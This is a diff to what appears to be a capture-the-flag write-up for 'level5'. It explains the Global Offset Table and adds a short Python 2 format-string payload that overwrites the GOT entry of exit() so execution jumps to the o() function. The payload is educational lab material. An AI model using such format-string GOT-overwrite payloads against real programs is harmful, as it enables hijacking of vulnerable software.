@@ -4,10 +4,14 @@
 * to solve this level we have to overwrite GOT table of the exit() in n function, so we jump to o() instead of the real exit()
 
 what is got ??
-* 
+* The Global Offset Table (or GOT) is a section inside of programs that holds addresses of functions that are dynamically linked.
+most programs don't include every function they use to reduce binary size. Instead,
+common functions (like those in libc) are "linked" into the program so they can be saved once on disk and reused by every program.
 
-
+* the following code is used to pwn level5:
+----------------------------------------
 import struct
 
 exit_got = struct.pack("I", 0x8049838)
 print exit_got + " %134513824p" + "%4$n"
+---------------------------------------------
